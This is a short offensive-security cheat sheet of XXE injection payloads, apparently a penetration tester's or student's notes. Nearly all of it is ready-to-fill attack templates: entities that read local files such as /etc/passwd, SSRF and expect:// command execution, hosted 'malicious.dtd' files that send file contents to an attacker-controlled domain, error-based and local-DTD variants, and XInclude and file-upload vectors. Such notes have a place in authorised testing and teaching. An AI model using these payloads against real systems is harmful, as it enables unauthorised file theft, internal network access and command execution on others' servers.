# XXE
## Direct
### File Retrieval
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://<FILE>"> ]>  
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### SSRF
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<PROTOCOL>://<DOMAIN>"> ]>
```

### System Commands
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://<COMMAND>"> ]>  
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## External File Exfiltration
**Note: Some files cannot be fetched via HTTP(s), since /r/n is validated through the URL. Could use FTP (Don't know if Burp supports)**
## POC
- /etc/passwd
- /etc/hostname

### Data in Response
#### Hosted DTD
**Hosted on `http://<DOMAIN>/malicious.dtd`**
```dtd
<!-- Define file to contents of file -->
<!ENTITY % file SYSTEM "file://<FILE>">
<!-- Define eval as stored entity -->
<!-- Contains encoded exfiltrate which queries home domain, with file contents -->
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '<PROTOCOL>://<DOMAIN>/?res=%file;'>">

<!-- Load eval entity -->
%eval;
<!-- Query our domain with file contents in its path -->
%exfiltrate;
```

#### Injected XML
```xml
<!-- Points target to go to our DTD -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "<PROTOCOL>://<DOMAIN>/malicious.dtd"> %xxe; ]>
```

### Data in Error
#### Hosted DTD
**Hosted on `http://<DOMAIN>/malicious.dtd`**
```dtd
<!-- Define file to contents of file -->
<!ENTITY % file SYSTEM "file://<FILE>">
<!-- Define eval as stored entity -->
<!-- Contains encoded error which throws an error with file contents -->
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///<DOESNOTEXIST>/%file;'>">

<!-- Load eval entity -->
%eval;
<!-- Throw the error -->
%error;
```

## Hybrid DTDs
**When the DTD cannot be external**
```
<!DOCTYPE foo [  
<!-- Non-controllable DTD location -->
<!ENTITY % local_dtd SYSTEM "file://<LOCAL_DTD>">

<!-- Redefine existing custom_entity as stored entities -->
<!-- NOTE the HTML encodings -->
<!-- Stored entity defines file as contents of file -->
<!-- Stored entity stores nested entity, which throws an error with file contents -->
<!-- Stored entity then sequentially stores encoded entities -->
<!ENTITY % custom_entity "
<!ENTITY &#x25; file SYSTEM 'file://<FILE>'>
<!ENTITY &#x25; eval '<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///<DOESNOTEXIST>/&#x25;file;&#x27;>'>  
&#x25;eval;  
&#x25;error;  
"> 

<!-- Parse stored encoded entities -->
%local_dtd;  
]>
```

# XInclude
**Inject like XSS**
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="<TYPE (text)>" href="file://<FILE>"/></foo>
```

# File Upload
**Supported files: XML, SVG, SOAP, DOCX, XLSX, DTD**
**For SVG, its probably necessary to play with viewbox to see everything**
**Good reference [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-in-exotic-files)**